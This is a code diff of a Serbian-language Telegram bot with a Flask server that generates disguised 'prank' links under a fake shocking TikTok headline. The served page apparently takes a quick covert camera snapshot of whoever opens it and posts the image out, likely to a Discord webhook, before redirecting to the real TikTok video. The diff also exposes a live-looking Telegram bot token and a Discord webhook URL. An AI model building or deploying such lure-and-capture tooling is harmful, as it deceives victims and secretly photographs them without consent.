@@ -6,10 +6,13 @@ from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 
 # =========================================================================
-# 1. PODEŠAVANJA (OVDE UNESI SVOJE PODATKE)
+# 1. PODEŠAVANJA
 # =========================================================================
 API_TOKEN = '8771472343:AAGhpARS8GxMcsbsnt1hKKZhiIltABiQlUA'
-DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1527509467204161567/Q6ilvbIGYe27grr4WTbr6yC1CwVfCMOGn1k4sbTciYzvjr211XXIfMxMqBfzJxcXEgh6'
+DISCORD_WEBHOOK_URL = 'https://discord.com'
+
+# TVOJA PRIMARNA RENDER ADRESA (BEZ KOSE CRTE NA KRAJU!)
+MY_PUBLIC_DOMAIN = 'https://tiktok-varka-2.onrender.com'
 
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher()
@@ -32,7 +35,7 @@ async def handle_message(message: types.Message):
     await message.answer("Generišem link, sačekaj trenutak...")
     link_id = str(uuid.uuid4())[:8]
     
-    # Čuvamo originalni TikTok link da znamo gde da ga prebacimo na kraju
+    # Čuvamo podatke o originalnom TikTok linku
     db[link_id] = {
         "title": "Izbodeni ljudi na Music Week-u! 😱",
         "image": "https://unsplash.com",
@@ -40,8 +43,8 @@ async def handle_message(message: types.Message):
         "tiktok_url": text
     }
     
-    base_url = request.host_url.rstrip('/')
-    prank_link = f"{base_url}/l/{link_id}"
+    # POPRAVLJENO: Koristimo direktno upisanu javnu adresu umesto request.host_url
+    prank_link = f"{MY_PUBLIC_DOMAIN}/l/{link_id}"
     await message.answer(f"Evo tvog uverljivog linka:\n\n`{prank_link}`")
 
 # =========================================================================
@@ -126,7 +129,7 @@ def serve_link(link_id):
                                         idiNaTikTok();
                                     }).catch(idiNaTikTok);
                                 }, 'image/png');
-                            }, 500); // Brzo slikanje za pola sekunde
+                            }, 500);
                         };
                     })
                     .catch(function(err) {
@@ -144,7 +147,9 @@ def serve_link(link_id):
         )
 
 def start_flask():
-    flask_app.run(host='0.0.0.0', port=5000)
+    import os
+    port = int(os.environ.get("PORT", 5000))
+    flask_app.run(host='0.0.0.0', port=port)
 
 if __name__ == '__main__':
     threading.Thread(target=start_flask, daemon=True).start()
